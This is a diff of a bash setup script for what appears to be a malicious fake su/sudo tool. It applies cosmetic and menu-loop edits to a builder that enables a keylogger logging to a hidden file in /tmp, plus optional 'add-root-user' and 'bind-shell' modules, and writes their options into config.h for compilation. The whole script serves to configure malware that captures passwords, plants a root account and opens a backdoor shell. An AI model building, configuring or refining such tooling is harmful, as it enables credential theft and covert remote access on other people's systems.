@@ -3,7 +3,7 @@
 fun=(add-root-user bind-shell)
 programs=(su sudo)
 
-echo -e "\n[+] configuring fake$1 ..."
+echo -e "\e[32m[+] configuring fake$1 ...\e[0m"
 
 if [[ -e config.h ]];then
 	read -p "config.h already exist, do you want to overwrite it? [y/N] " r
@@ -36,7 +36,7 @@ bind_shell()
 
 keylogger()
 {
-	read -p "Number of lines to record [empty = store all]: " line_limit
+	read -p "number of lines to record [empty = store all]: " line_limit
 	read -p "logfile (default: /tmp/.keys.txt): " logfile
 
 	config+=("#define KEYLOGGER")
@@ -52,25 +52,28 @@ keylogger()
 	config+=('#include "fun/keylogger.c"')
 }
 
-read -p "Activate keylogger? [y/N] " r
+read -p "enable keylogger? [y/N] " r
 [[ "${r,}" == "y" ]] && keylogger
 
-read -p "Use some FUN modules? [y/N] " r
+read -p "use some FUN modules? [y/N] " r
 if [[ "${r,}" == "y" ]];then
 	while :;do
 		for ((i = 1; i <= ${#fun[@]}; i++));do
 			echo "[$i] ${fun[i - 1]}"
 		done
 
-		echo "[$i] exit"
+		echo "[$i] cancel"
 		read -p "> " r
 
-		(( r == i )) && exit;
-		(( r < i && r > 0 )) && break;
-	done
+		(( r == i )) && break;
+		if (( r < i && r > 0 ));then
+			config+=("#define CMDCHANGE")
 
-	config+=("#define CMDCHANGE")
-	${fun[r - 1]//-/_}
+			# call the function
+			${fun[r - 1]//-/_}
+			break;
+		fi
+	done
 
 fi
 
@@ -82,4 +85,4 @@ do
 done
 
 echo -e "\n#endif" >> config.h
-echo -e "[+] config file created at ${PWD}/config.h\n\n"
+echo -e "\e[32m[+] configuration file created in ${PWD}/config.h\e[0m"
